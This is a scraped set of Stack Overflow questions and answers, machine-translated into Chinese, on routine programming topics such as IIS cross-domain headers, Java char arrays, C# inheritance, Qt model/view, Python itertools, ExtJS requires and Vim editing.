            keyStore.load(new FileInputStream(keyStoreFile), keyStorePassword != null ? keyStorePassword
                    .toCharArray() : SimpleSSLHelloWorld.EMTPY_STRING.toCharArray());
        }

        return keyStore;
    }

    public static void logRequest(final Request request) throws IOException {
        StringBuilder builder = new StringBuilder();

        builder.append(">>> REQUEST\n");
        builder.append(request);
        builder.append(request.getContent());

        System.out.println(builder);
    }

    public static void logResponse(final Response response) throws IOException {
        StringBuilder builder = new StringBuilder();

        builder.append("<<< RESPONSE\n");
        builder.append(response);

        if (response.getContentLength() > 0) {
            builder.append("... ").append(response.getContentLength()).append(" bytes ...\n");
        }

        System.out.println(builder);
    }

    public static void dummyResponse(final Response response) throws IOException {
        PrintStream body = response.getPrintStream();
        long time = System.currentTimeMillis();

        response.set("Content-Type", "text/plain");
        response.set("Server", "SSL HelloWorld/1.0 (Simple 4.0)");
        response.setDate("Date", time);
        response.setDate("Last-Modified", time);

        body.println("Hello World: " + ++SimpleSSLHelloWorld.count);
        body.close();
    }
} 
```

我很困惑，不确定为什么它不能在 curl 上工作。

# asp.net-mvc-3 - 使用 IIS7.5 解决跨域问题

> ID：10989575
> 
> 赞同：1
> 
> 时间：2012-06-12T01:39:03.457
> 
> 标签：asp.net-mvc-3, iis, cross-domain, iis-7.5

我正在构建一个可以发布的应用程序，但是我在我的 ajax 调用中遇到了跨域脚本问题。

我正在使用 IIS7.5，并且我有以下应用程序设置

营销应用程序 - 'www.mydomain.com' - 用作营销网站和注册新业务。我有一个规则强制任何非 www。成为 www

业务应用程序 - 'https://newbusiness.mydomain.com' - 用于访问他们订阅的服务

API 应用程序 - 'https://newbusiness.mydomain.com/api/.......' - 用于业务应用程序进行 crud 操作

API应用程序是在业务应用程序下运行的应用程序。包含许多安全方法和一些匿名方法。

使用 jquery，我的营销应用程序尝试调用 api 应用程序时遇到问题。目前，如果我想从我的营销网站调用 api，我正在执行类似“https://api.mydomain.com/api/whatevermethod”的操作，因为它是跨域的，它会失败。

无论如何，我可以以某种方式将“https://api.mydomain.com/api/whatevermethod”映射为“https://mydomain.com/api/whatevermethod”，因为这会让我绕过跨域问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T13:50:51.257

您需要在 IIS 中允许跨域调用。您可以通过设置`Access-Control-Allow-Origin`和`Access-Control-Allow-Headers`

前任：

在根 web.config

```
<system.webserver>       
   <httpprotocol>
     <customheaders>
       <add name="access-control-allow-origin" value="*" />  
       <add name="access-control-allow-headers" value="content-type" />
     </customheaders>
    </httpprotocol>
 </system.webserver> 
```

取自[这里](http://tipila.com/tips/83/allow-cross-domain-javascript-calls-in-iis-7)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-07-22T01:37:49.223

以防万一您还从 Amila 的回答中收到错误 500，这就是整个 web.config 文件内容的样子

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpProtocol>
            <customHeaders>
                <add name="access-control-allow-origin" value="*" />
                <add name="access-control-allow-headers" value="content-type" />
            </customHeaders>
        </httpProtocol>
    </system.webServer>
</configuration> 
```

# java - 奇怪的 toCharArray() 行为

> ID：10989578
> 
> 赞同：3
> 
> 时间：2012-06-12T01:39:14.817
> 
> 标签：java, arrays, char

我正在尝试`toCharArray()`并发现一些奇怪的行为。

认为`private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();`

```
 System.out.println(HEX_CHARS);

  /* prints 0123456789abcdef */

 System.out.println("this is HEX_CHARS "+HEX_CHARS); 
  /* prints [C@19821f */ 
```

这背后有什么理论上的原因吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-12T01:43:49.697

这是因为两次调用中的参数to`println`不同。

第一个参数用 调用，`char[]`第二个参数用字符串调用，其中`HEX_CHARS`通过调用转换为`.toString()`.

`println()`有一个接受 charArray 的重写方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T01:44:58.067

第一行调用方法

```
print(char[] s) 
```

在 PrintStream 上打印您期望的内容。第二个调用方法

```
print(String s) 
```

在哪里将字符串与数组的 toString 实现连接起来，这是你得到的丑陋的东西（[C@19821f）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T01:44:28.853

数组是对象，它的 toString 方法返回

```
getClass().getName() + "@" + Integer.toHexString(hashCode()) 
```

在您的情况下`[C@19821f`，表示 char[] 和 @`19821f`是其十六进制表示法的哈希码。

如果要打印该数组中的值，请使用迭代或`Arrays.toString`方法。

```
`System.out.println(Arrays.toString(HEX_CHARS));` 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T01:41:55.923

奇怪的输出是`char[]`类型的 toString()。出于某种奇怪的原因，java 决定在数组类型上使用一个无用的默认实现 toString()。试试吧`Arrays.toString(HEX_STRING)`。

# c# - C#：子类可以限制对父类方法的访问吗？

> ID：10989579
> 
> 赞同：3
> 
> 时间：2012-06-12T01:39:19.197
> 
> 标签：c#, inheritance

我需要两个稍微不同的类，它们具有相同的成员，但其中一个类需要用户较少的交互可能性。我希望从第一类继承第二类。
有没有办法限制子类对父方法的访问，这样如果有人创建了子对象，他们将无法访问某些父类方法（在父类中是公共的）？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T01:46:25.847

不，原因如下：

```
class Animal { 
   public void Speak() { Console.WriteLine("..."); }
}

class Dog : Animal { 
   remove void Speak();  // pretend you can do this
}

Animal a = GetAnAnimal(); // who knows what this does

a.Speak();  // It's not known at compile time whether this is a Dog or not 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-12T01:43:33.053

你应该有一个基础抽象类来保存两个类的共同点，然后让其他两个类继承它并添加方法和属性等。

```
abstract class MyBaseClass
{
    public int SharedProperty { get; set; }

    public void SharedMethod()
    {
    }
}

class MyClass1 : MyBaseClass
{
    public void Method1()
    {
    }
}

class MyClass2 : MyBaseClass
{
    public void Method2()
    {
    }
} 
```

`MyClass1`有：`SharedProperty`、`SharedMethod`和`Method1`。

`MyClass2`有：`SharedProperty`、`SharedMethod`和`Method2`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T01:44:13.473

不完全是，不。最接近的方法是在基（父）类中提供虚拟方法并在派生（子）类中覆盖/新方法，并且不提供任何行为或适当的异常；

```
public class Base
{
    public virtual void DoSomething()
    { . . . }
}

public class Derived : Base
{
    public override void DoSomething()
    { 
        throw new NotSupportedException("Method not valid for Derived");
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T01:49:24.457

创建基类，并使应该隐藏的方法受到保护。

创建一个接口，声明您想要公开的方法

创建一个子类，继承自基类，并显式实现接口。从接口实现方法调用受保护的方法。

然后子类的用户只能看到接口的成员（这需要他们将实例转换为接口）

# qt - 使用嵌套对象集合开始 Qt 模型/视图

> ID：10989580
> 
> 赞同：0
> 
> 时间：2012-06-12T01:39:22.317
> 
> 标签：qt, model-view

我主要是一名 .Net 开发人员，并且已经研究 Qt 有一段时间了。我现在正处于尝试在 Qt 中实现模型/视图框架的阶段。我想我掌握了基本原理，但不清楚如何在一个更复杂的 UI 中将东西挂在一起，小部件需要相互通信。鉴于以下情况：

```
// 'domain' model classes
class NestedDomainModel1
{
public:
  NestedDomainModel1();

  QString name() const;
  void setName(const QString& newName);

  // other properties

private:
  QString m_name;
};

class NestedDomainModel2
{
public:
  NestedDomainModel2();

  QString name() const;
  void setName(const QString& newName);

  // other properties
};

class MyDomainModel
{
public:
  MyDomainModel();

  void addNestedModel1(const NestedDomainModel1& modelToAdd);
  NestedDomainModel& nestedObjectModel1At(int index);
  int nestedObjectModel1Count() const;

  // repeat for model 2

private:

  QList<NestedDomainModel1> m_nestedModels1;
  QList<NestedDomainModel2> m_nestedModels2;
};

// 'GUI' classes
class MainWindow : public QMainWindow
{

private:
  MyDomainModel* m_model;
  MyTreeViewWidget* m_treeWidget;  // -> this sits in a left dock window
  MyInfoDisplayWidget* m_infoWidget; // -> this sits in a right dock window and display details about the item selected in the tree
};

class MyDomainModelTreeModel : public QAbstractItemModel
{
public:
  explicit MyDomainModelTreeModel(MyDomainModel* model);

  // required overrides for QAbstractItemModel
private:
  MyDomainModel* m_model;
};

class MyTreeViewWidget : public QWidget
{
public:
  // Take a pointer to the domain model and create a model for the 'view'.
  // Will create a tree like:
  // Nested Objects 1
  //   |- object 001
  //   |- object 002
  //   |- you get the idea
  // Nested Objects 2
  //   |- other object 001
  //   |- more of the same
  explicit MyTreeViewWidget(MyDomainModel* model);

public slots:  
  // Used to notify widget when an item is added to the underlying model.
  void nestedModel1Added(); 
  void nestedModel2Added(); 

signals:
  void nestedModel1Selected(NestedDomainModel1& selectedModel);  
  void nestedModel2Selected(NestedDomainModel2& selectedModel);

private slots:
  // connect to tree view event when an item is selected and if all ok, emit one of the selected events
  void onTreeItemSelectionChanged(const QItemSelection &selected, const QItemSelection &deselected);  

private:
  QTreeView* m_treeView;
  MyDomainModelTreeModel* m_treeModel;
};

class MyNestedClass1ViewModel : QAbstractItemModel
{
public:
  explicit MyNestedClass1ViewModel(NestedDomainModel1* model);

  setModel(NestedDomainModel1* model);

  // required overrides for QAbstractItemModel

private:
  NestedDomainModel1* m_model
};

class MyInfoDisplayWidget : public QWidget
{
public:
  explicit MyInfoDisplayWidget(QWidget* parent = 0);

public slots:
  // this is connected to the 'tree' widget signal in MainWindow
  void setModel(NestedDomainModel1& selectedModel);
}; 
```

UI 的基本前提在感觉上类似于 Visual Studio。树类似于解决方案资源管理器，“信息显示”类似于属性窗口。

1.  这就是你使用模型/视图框架的方式吗？对于那些熟悉 WPF/Silverlight 开发的人来说，模型/视图框架是否类似于 MVVM（在高层次上），因为它是“视图模型”并包装/包含域模型？

2.  这是您使用模型/视图框架连接小部件的方式吗（即，一个小部件将模型的指针或引用传递给另一个小部件）？还是我应该使用 SelectionModel？由于树模型包含不同类型的对象，这是否有效？

3.  如何识别根节点？例如，当创建 MyNestedObject1 并需要将其添加到树时，我是否依赖于根节点位于模型索引 QModelIndex(0, 0) 的知识（即第 0 行，父索引无效）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T08:41:42.450

我发现您使用的术语有点尴尬，例如 MyNestedClass1ViewModel 只是一个模型。我不确定 ViewModel 会是什么。

您在此示例中缺少的是实际视图。MyTreeViewWidget 只是一个愚蠢的小部件，实际上根本不是 Qt 术语中的视图，它本质上只是一个您想要在其中显示数据的愚蠢“画布”。所以这样做的方法是：

1.  您在 NestedDomainModel2 等普通对象中有基础数据。这些不是 Qt 意义上的模型，我不会这样命名它们。它们只是普通对象，不实现任何 MVC 接口。

2.  您的 MyNestedClass1ViewModel，它是一个 Qt 模型类。它在其 data() 和 setData() 方法的实现中访问上述 (1) 的底层数据对象。

3.  从 QAbstractItemView 子类化的视图类。这就是你所缺少的。它具有从上面 (2) 插入模型类 API 的所有魔术钩子。它从模型中获取信号，告诉它何时发生更改，这些信号调用诸如 dataChanged()、rowsInserted() 之类的方法。您实现这些方法以在下面第 (4) 点中的显示小部件中进行适当的更改。

4.  您的显示小部件。它本身不实现任何模型/视图 API，而是由您的视图更新。如果它是交互式的并且可用于更改模型数据，您可以通过在模型上调用 setData()、insertRows()、removeRows() 等来实现。显示更改将通过视图自动传播回小部件。注意不要生成从 widget->model->view->widget->model->view 等传播的无限循环。

我做了类似的事情来使用 QGraphicsScene/QGraphicsView 来显示模型中的项目。尽管它的名字 QGraphicsView 不是模型/视图框架的一部分，所以我实现了一个自定义视图类，它在 QGraphicsScene 上绘制模型数据。

这是我的代码，在 Python 中。它在 SF 战争游戏的地图上绘制世界：

```
class WorldItemView(QtGui.QAbstractItemView):
""" Hidden view which interfaces between the model and the scene.
"""
def __init__(self, model, parent=None):
    QtGui.QAbstractItemView.__init__(self, parent)
    self.hide()
    self.setModel(model)
    self.my_model = model
    self.scene = MapScene(self.my_model)
    self.resetWorlds()

def dataChanged(self, topLeft, bottomRight):
    top_row = topLeft.row()
    bottom_row = bottomRight.row()
    #debug_log("Top row " + str(top_row) + " Bottom row " + str(bottom_row))
    for row in range(top_row, (bottom_row + 1)):
        self.scene.worldChanged(row)

def rowsInserted(self, parent, start, end):
    for row in range(start, (end + 1) ):
        pmi = self.my_model.getPMI(row)
        self.scene.insertWorld(pmi)

def rowsAboutToBeRemoved(self, parent, start, end):
    for row in range(start, (end + 1)):
        self.scene.removeWorld(row)

def resetWorlds(self):
    self.scene.clearWorlds()
    # Add worlds to scene
    last_row = self.my_model.rowCount() - 1
    self.rowsInserted(None, 0, last_row) 
```

我希望这有帮助。

# c# - 使用 Razor 在模型中显示位图

> ID：10989583
> 
> 赞同：1
> 
> 时间：2012-06-12T01:39:52.573
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, razor

我目前正在开发的一个 webApp 要求我将照片作为 a 存储`byte[]`在数据库中。然后它需要我将它们拉出来并在视图中显示它们。我创建了一个`photoContainer`保存位图而不是保存位图`byte[]`并将其传递给视图。但我似乎无法弄清楚如何从那里显示它。我已经尝试将源设置为`model.Image`，但没有奏效。无论如何要在视图中的模型中显示位图吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T03:48:21.043

In a controller place this

```
public FileResult GetImg(int id)
    {                       
         var image = db.Categories.First(m => m.CategoryID == id).Picture;

         byte[] imageData;
         if(image != null)
         {
             imageData = image.ToArray();
             return File( imageData, image.contentType );
         }
         else
         {
             return null;
         }
     } 
```

In your view place this

```
<img src="@Url.Action("GetImg", "ControllerTheActionAboveIsPlacedIn", new { id = Model.ImageId})" /> 
```

# python - Python 用 itertools.product 创建一个列表？

> ID：10989585
> 
> 赞同：11
> 
> 时间：2012-06-12T01:40:11.807
> 
> 标签：python, itertools

我正在从范围列表中创建一个带有 itertools 的列表，到目前为止我有这个：

```
start_list = [xrange(0,201,1),xrange(0,201,2),xrange(0,201,5),xrange(0,201,10),xrange(0,201,20),xrange(0,201,50),xrange(0,201,100),xrange(0,201,200)] 
```

现在，我知道如果我尝试运行下一行，它会杀死我的 python 解释器：

```
next_list = list(itertools.product(*start_list)) 
```

我想知道的是是否可以放入一个参数来检查每个元组，检查其项目的总和，如果等于一定数量，则仅将它们放入**next_list中？**

也许是这样的：

```
next_list = list(itertools.product(*start_list,sum(tuples)=200)) 
```

我知道这是不对的，我可能需要开始重新考虑我的处理方式。生成器中 start_list 的范围是否会太多而无法构建另一个列表？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-12T02:00:05.060

最好只使用列表理解

```
new_list = [item for item in itertools.product(*start_list) if sum(item) == 200] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T17:53:39.160

```
Solution      Runtime           Fn calls           Lines of Code
--------   ----------   ------------------------   -------------
gnibbler   2942.627 s   1473155845 (1.5 billion)          1
me_A         16.639 s     28770812 ( 29 million)          5
me_B          0.452 s       774005 ( .8 million)         43 
```

* * *

解决方案我_A：

```
import itertools

def good_combos(basis, addto):
    good_sums = set(addto-b for b in basis[0])
    return ([addto-sum(items)]+list(items) for items in itertools.product(*basis[1:]) if sum(items) in good_sums)

next_list = list(good_combos(start_list, 200)) 
```

请注意，如果您首先将**最长的列表传递给它，这会****更快**。

 **该解决方案用集合查找替换了一级迭代；最长的列表包含 200 个项目，这几乎快 200 倍也就不足为奇了。

* * *

解决方案我_B：

```
import itertools
from bisect import bisect_left, bisect_right

def good_combos(addto=0, *args):
    """
    Generate all combinations of items from a list of lists,
    taking one item from each list, such that sum(items) == addto.

    Items will only be used if they are in 0..addto

    For speed, try to arrange the lists in ascending order by length.
    """
    if len(args) == 0:                          # no lists passed?
        return []

    args = [sorted(set(arg)) for arg in args]   # remove duplicate items and sort lists in ascending order
    args = do_min_max(args, addto)              # use minmax checking to further cull lists

    if any(len(arg)==0 for arg in args):        # at least one list no longer has any valid items?
        return []

    lastarg = set(args[-1])
    return gen_good_combos(args, lastarg, addto)

def do_min_max(args, addto, no_negatives=True):
    """
    Given
      args          a list of sorted lists of integers
      addto         target value to be found as the sum of one item from each list
      no_negatives  if True, restrict values to 0..addto

    Successively apply min/max analysis to prune the possible values in each list

    Returns the reduced lists
    """
    minsum = sum(arg[0] for arg in args)
    maxsum = sum(arg[-1] for arg in args)

    dirty = True
    while dirty:
        dirty = False
        for i,arg in enumerate(args):
            # find lowest allowable value for this arg
            minval = addto - maxsum + arg[-1]
            if no_negatives and minval < 0: minval = 0
            oldmin = arg[0]
            # find highest allowable value for this arg
            maxval = addto - minsum + arg[0]
            if no_negatives and maxval > addto: maxval = addto
            oldmax = arg[-1]

            if minval > oldmin or maxval < oldmax:
                # prune the arg
                args[i] = arg = arg[bisect_left(arg,minval):bisect_right(arg,maxval)]
                minsum += arg[0] - oldmin
                maxsum += arg[-1] - oldmax
                dirty = True
    return args

def gen_good_combos(args, lastarg, addto):
    if len(args) > 1:
        vals,args = args[0],args[1:]
        minval = addto - sum(arg[-1] for arg in args)
        maxval = addto - sum(arg[0] for arg in args)
        for v in vals[bisect_left(vals,minval):bisect_right(vals,maxval)]:
            for post in gen_good_combos(args, lastarg, addto-v):
                yield [v]+post
    else:
        if addto in lastarg:
            yield [addto]

basis = reversed(start_list)  # more efficient to put longer params at end
new_list = list(good_combos(200, *basis)) 
```

do_min_max() 确实无法在您的数据集上完成任何事情-每个列表都包含 0 和 addto，从而剥夺了它的任何影响力-但是在更一般的数据基础上，它可以大大减少问题的大小。

此处的节省在于连续减少在每个迭代级别（树修剪）考虑的项目数量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T01:45:29.763

用这个：

> next_list = list(item for item in itertools.product(*start_list) if sum(item) == 200)**

# javascript - ExtJS：需求的意义何在？

> ID：10989587
> 
> 赞同：20
> 
> 时间：2012-06-12T01:40:38.547
> 
> 标签：javascript, extjs, extjs4, extjs4.1, extjs-mvc

我一直在试图弄清楚 Ext JS 4 中需要做什么，但我似乎无法给出一个合理的答案。假设我有以下代码：

**应用程序.js**

```
Ext.Loader.setConfig({
  enabled: true
});

Ext.Loader.setPath('Ext.ux', 'examples/ux');

Ext.application({
  name: 'Test',
  appFolder: 'app',
  controllers: ['TheController'],
  requires: ['Test.Utils', 'Test.Utils2'],  // I don't think this does anything... couldn't find this option for Ext.application
  launch: function() {
    Ext.create('Ext.Viewport', {
      layout: 'border',
      items: [{
        xtype: 'thegrid',
        region: 'center',
        title: 'blah!'
      }]
    });
  }
}); 
```

**应用程序/控制器/TheController.js**

```
Ext.define('Test.controller.TheController', {
  extend: 'Ext.app.Controller',
  models: ['TheModel'],
  stores: ['TheStore'],
  views: ['TheGrid'],
  init: function() {
  }
}); 
```

**应用程序/视图/TheGrid.js**

```
Ext.define('Test.view.TheGrid', {
  extend: 'Ext.grid.Panel',
  alias: 'widget.thegrid',
  requires: ['Test.store.TheStore'],
  store: 'TheStore',
  columns: [
    {header: 'Name', dataIndex: 'name'},
    {header: 'Phone', dataIndex: 'phone'},
    {header: 'Hello', dataIndex: 'hello'}
  ]
}); 
```

**应用程序/商店/TheStore.js**

```
Ext.define('Test.store.TheStore', {
  extend: 'Ext.data.Store',
  requires: ['Test.model.TheModel', 'Test.Utils'],
  model: 'Test.model.TheModel',
  data: [
    {name: 'keanu reeves', phone: '1800matrices', hello: Test.Utils.getText()},
    {name: 'james earl jones', phone: '1800starwar', hello: 'nothing here'},
    {name: 'barack obama', phone: '1800prsidnt', hello: 'hello world'}
  ]
}); 
```

**应用程序/模型/TheModel.js**

```
Ext.define('Test.model.TheModel', {
  extend: 'Ext.data.Model',
  fields: [
    {name: 'name', type: 'string'},
    {name: 'phone', type: 'string'},
    {name: 'hello', type: 'string'}
  ]
}); 
```

**应用程序/Utils.js**

```
Ext.define('Test.Utils', {
  singleton: true,
  requires: ['Test.Utils2'],
  getText: function() {
    return Test.Utils2.hello + 'world';
  }
}); 
```

**应用程序/Utils2.js**

```
Ext.define('Test.Utils2', {
  singleton: true,
  hello: 'hello'
}); 
```

我意识到这是一个很长的例子，但我需要确保我完全描绘了我在做什么。Utils 依赖于 Utils2，因为它需要调用 Utils2 的 hello 变量。其余代码是设置网格并调用 TheStore 中的 Utils.getText 函数。Firebug`Test.Utils is undefined`在 TheStore.js 的第 6 行抛出了一个错误，此时 Test.Utils 显然不存在，但 Test.Utils2 存在。

我的问题是......为什么 Utils2 存在，但 Utils 不存在？我认为需要引入我需要的类，从而允许我使用它们，但我想我错了。我已经阅读了 Sencha 文档和大量线程，但没有什么真正有意义，也没有真正解释这个例子。任何人都可以在这里发表一些见解吗？我会很感激的。

**另外，我意识到我在这里做了一些愚蠢的事情，但这只是一个例子，所以我不想结合全局 Utils 或根本不使用全局变量......我只是想弄清楚需要选项。

**更新**

感谢Izhaki在下面的回答，我想出了一些办法。如果我想在我定义的类中使用所需的类，我将不得不等待对象被创建（IE，使用 initComponent），所以我的存储和网格代码更改为：

**应用程序/商店/TheStore.js**

```
Ext.define('Test.store.TheStore', {
  extend: 'Ext.data.Store',
  requires: ['Test.model.TheModel'],
  model: 'Test.model.TheModel'
}); 
```

**应用程序/视图/TheGrid.js**

```
Ext.define('Test.view.TheGrid', {
  extend: 'Ext.grid.Panel',
  alias: 'widget.thegrid',
  requires: ['Test.store.TheStore'],
  store: 'TheStore',
  columns: [
    {header: 'Name', dataIndex: 'name'},
    {header: 'Phone', dataIndex: 'phone'},
    {header: 'Hello', dataIndex: 'hello'}
  ],
  // This is the change that works
  initComponent: function() {
    this.callParent();
    this.store.loadData([
      {name: 'keanu reeves', phone: '1800matrices', hello: Test.Utils.getText()},
      {name: 'james earl jones', phone: '1800starwar', hello: 'nothing here'},
      {name: 'barack obama', phone: '1800prsidnt', hello: 'hello world'}
    ]);
  }
}); 
```

这行得通，但我的最后一个问题是……我是否必须满足 TheStore 中的 TheModel 和/或 TheGrid 中的 TheStore 的要求？看起来 TheController 正在处理所有这些需求，因为我可以在 TheGrid 中使用 Test.Utils，但 TheGrid 并没有明确说明它需要 Test.Utils。

此外， Sencha 文档中的[这个示例](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.Class-cfg-requires#cfg-requires)让我更加困惑，因为在创建 TheStore 之前我显然没有使用 Test.Utils，但是这个示例似乎可以使用 Child 类而无需等待它初始化（使用 initComponent） .

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-12T02:27:47.573

这实际上根本不是一个愚蠢的问题。

您可以将 requires 看作是告诉 ExtJS 的一种方式：

“当你构造这个类的对象时，请确保首先动态加载所需的脚本”。

你对这一行是对的：

```
requires: ['Test.Utils', 'Test.Utils2'], 
```

中不需要`app.js`，原因是应用程序已经具有：

```
controllers: ['TheController'], 
```

这与说您需要`TheController`驻留的js脚本相同（任何模型/视图/控制器/存储定义也意味着需要相关脚本，即将动态加载）。

`TheController`有：

```
requires: ['Test.model.TheModel', 'Test.Utils'], 
```

这将动态加载这些 - 这就是为什么`requires`不需要它`app.js`;

你得到 Firebug throwing `Test.Utils`is undefined 的原因是你给了一个 config( `hello`) 引用了一个尚未动态加载的对象——在构造`Test.Utils`之前，范围内没有。`TheStore`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:15:14.953

1.  没有它，HasMany 关系根本行不通

2.  它帮助 JSBuilder 知道要包含哪些文件。例如，如果您的 Viewport 使用边框布局，它会错误地不包含在内，您必须使用 uses 或 requires 来包含它。

# c# - 在asp.net web表单中进行验证后执行javascript打印

> ID：10989591
> 
> 赞同：0
> 
> 时间：2012-06-12T01:41:42.630
> 
> 标签：c#, asp.net, validation

我有一个 asp.net 3.5 网络表单，我正在使用多个服务器端验证器控件，我希望在验证页面后，在提交按钮单击事件处理程序时触发打印的 javascript 代码

我尝试使用 OnClientClick 但这甚至会在页面无效时触发打印页面 javascript，

我将如何做到这一点，打印仅在表单有效时显示？

这是我的代码，提前谢谢

```
 <asp:Button ID="btnAction" runat="server" OnClick="btnAction_Click"
    Text="Submit" />

    protected void btnAction_Click(object sender, EventArgs e)
        {
            if (Page.IsValid)
            {

                // define SMTP client

                SmtpClient smtp = new SmtpClient();

                //create the mail message
                MailMessage message = new MailMessage();

                //From address will be given as a MailAddress Object

                //To address collection of MailAddress

                message.To.Add("########");

                //CC and BCC optional
                //message.CC.Add("");

                // Change to false to not include HTML

                message.IsBodyHtml = true;

                message.Body += "<h2>info goes here</h2></br></br>";

                //send the message

                try
                {
                    smtp.Send(message);
                }

                catch (System.Net.Mail.SmtpException ex)
                {
                    throw new Exception(ex.Message.ToString());
                }
                catch (Exception ex)
                {
                    throw new Exception(ex.Message.ToString());
                }

                Page.ClientScript.RegisterStartupScript(this.GetType(),
    "OnPrintPage", "window.print();", true);

                  Response.Redirect("Confirmation.aspx?value=" +
    Server.UrlEncode(confirmationNumber));

                //Passing in session
                //Session["sessionname"] = confirmationNumber;

            }
            //End if Page is Valid Block

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:23:17.727

在打印命令之前检查 javascript 函数中的 Page_IsValid。

```
function PrintDocument()
{
    if (Page_IsValid) {
        // call your print function here....

      }
     else
     {
         // page is not validated.
     }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:31:00.030

那么，您是否希望在验证页面时显示“打印”按钮？如果是这样：

您不能使用 OnClientClick 创建另一个服务器端按钮来触发打印操作。在上述代码中的验证时，可以使该按钮可见。

# vim - 如何在 VIM 中跳入括号

> ID：10989595
> 
> 赞同：8
> 
> 时间：2012-06-12T01:42:12.193
> 
> 标签：vim

目前，我正在尝试学习 VIM 并禁用所有模式的箭头键。在输入新函数时，我总是同时打开和关闭括号，以免忘记它们。因为，我不能返回（没有箭头键）我想知道它是如何在 VIM 中完成的，因为一旦关闭，你就在括号之外。

退出 INSERT 模式，进入括号并再次进入 INSERT 模式是标准做法吗？或者你只是让括号打开直到你完成？

我确实知道 AutoClose 脚本。这个问题更有助于理解 VIM 的做事方式，所以我想知道其他开发人员是如何克服这个问题的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T01:45:07.170

忘记右括号会导致稍后突出显示问题，使您不太可能进一步忽略它们。

我建议养成在键入时在括号中间键入参数的习惯，并在完成参数后关闭括号。（无论如何，如果您正在尝试学习`vim`，这种变化似乎并不会太大而无法适应——您必须适应的其他事情的数量已经非常惊人了。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T01:49:36.500

Vim 模态特性背后的想法是，您将大部分时间花在普通模式下，而不是插入模式下。仅当您想要**插入**文本时才进入插入模式，并且每当您想要执行不插入原始文本的操作时 - 您会返回正常模式。

无论如何，如果由于某种原因您不想离开插入模式，您可以按`CTRL+o`运行单个正常模式命令。但我建议习惯于在模式之间切换——切换模式应该是 Vim 用户的第二天性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T01:55:02.370

问题：退出 INSERT 模式，移动到括号中并再次进入 INSERT 模式是标准做法吗？或者你只是让括号打开直到你完成？

回答：通常只键入函数参数，然后键入右括号。但是，是的，如果您已经输入了`)`，然后您决定要返回一个字符，您可能只需按 Escape 键，然后`i`在当前位置之前按插入。这只是两次击键，经验丰富的 vi 用户非常习惯按 Escape 键。

如果您实际键入`);`，则需要按 Escape 键，然后按`h`和`i`。如果你经常这样做，你会习惯的。

某些键组合成为第二天性。例如，您可以在 vi 中通过点击`x`, 来转置两个字符，以删除光标下的字符并使光标在下一个字符上；然后`p`，将该字符粘贴到光标位置之后。我一生中打字`xp`的次数已经够多了，我什至都没有考虑过……我的手指只知道那些键在哪里。我只是想“哦，我需要交换那些字符”，然后我的手指猛地伸出了`xp`.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-12T01:59:03.333

首先，在命令模式下`%`将您移动到相应的括号、大括号或方括号。

回答您的问题：是的，立即关闭括号、大括号、方括号等的人......很可能退出命令模式，然后重新进入插入模式以返回编辑。

对我来说，这甚至不是我注意到的事情。很快对你来说也是一样的。

每当我开始一个新的 if 语句时，我都会立即打开和关闭大括号。添加右大括号后，我点击`ESC``O`打开右大括号（或`ESC``k``i`）上方的行。然后我又开始打字了。

这绝不会给我带来不便或问题。所有这些很快就会成为你的第二天性......

此外，您甚至不会再考虑那些箭头键......您只会使用`h`返回（或更好的东西）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-08-02T16:19:47.400

一种选择是使用键映射跳转到左括号/括号。我倾向于立即关闭括号/括号以确保它们是平衡的（即使 vim 会生气地让我知道如果发生这种情况我会错过它们——习惯的力量）。把这个映射放到你的 vimrc 中：

`imap <C-S-h> <esc> :call search("[{[(]", "bes")<CR> i`

下面是命令分解：

*   以编辑模式映射`<CTRL-SHIFT-h>`到
*   `<ESC>`（回到正常模式），
*   `:call search("[({[]", "bes")<CR>`向后搜索左括号/括号并跳转到它，最后
*   `i`返回插入模式

所以我可以输入`foo();`, 然后`<CTRL-SHIFT-h>`跳回到括号中提供参数。

有点相关：研究[vim-surround 插件](https://github.com/tpope/vim-surround)，一旦你掌握了它，它就是一个生产力助推器！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-12T05:39:01.067

您**根本**不需要停止使用箭头键。这是一个愚蠢的想法。

`hjkl`*仅*当您触摸类型时才比箭头键“更好” ，因为它位于主行。如果您不触摸类型，您的手已经自然地做了很多运动，其余的都可以伸手去拿方向键。如果您不触摸类型，则没有主行。

不过，您的问题并不是真正的`hjkl`vs 箭头问题。您可以通过养成只输入左括号、然后是参数、然后是右括号的习惯或使用“自动关闭”机制来解决它。

您可以通过将此行添加到您的`~/.vimrc`:

```
inoremap ( ()<C-o>h 
```

